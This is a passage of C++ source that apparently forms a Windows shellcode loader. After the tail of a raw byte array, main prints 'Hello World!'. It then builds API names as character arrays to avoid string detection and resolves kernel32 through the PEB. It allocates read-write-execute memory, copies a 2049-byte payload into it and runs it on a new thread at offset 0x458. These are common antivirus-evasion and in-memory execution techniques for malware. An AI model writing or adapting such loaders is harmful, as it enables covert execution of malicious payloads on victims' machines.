    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00

};

using tpdVirtualAlloc = LPVOID ( WINAPI* ) ( LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect );
using tpdCreateThread = HANDLE ( WINAPI* ) ( LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId );


int main() {

    std::cout << "Hello World!\n";

    wchar_t wchKernel32[] = { 'k', 'e', 'r', 'n', 'e', 'l', '3', '2', '.', 'd', 'l', 'l', 0 };
    char chVirtualAlloc[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 0 };
    char chCreateThead[] = { 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 0 };

    auto pKernel32 = module_from_peb(wchKernel32);

    auto pVirtualAlloc = reinterpret_cast<tpdVirtualAlloc>(GetFunctionAddressByName(pKernel32, chVirtualAlloc));

    auto pAllocatedMem = reinterpret_cast<unsigned char*>(pVirtualAlloc(NULL, 2049, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE));

    auto pCreateThread = reinterpret_cast<tpdCreateThread>(GetFunctionAddressByName(pKernel32, chCreateThead));

    memcpy(pAllocatedMem, rawData, 2049);

    pCreateThread(
        NULL,
        NULL,
        reinterpret_cast<LPTHREAD_START_ROUTINE>(reinterpret_cast<uintptr_t>(pAllocatedMem) + 0x458),
        NULL,
        NULL,
        NULL
    );

    return 0;
}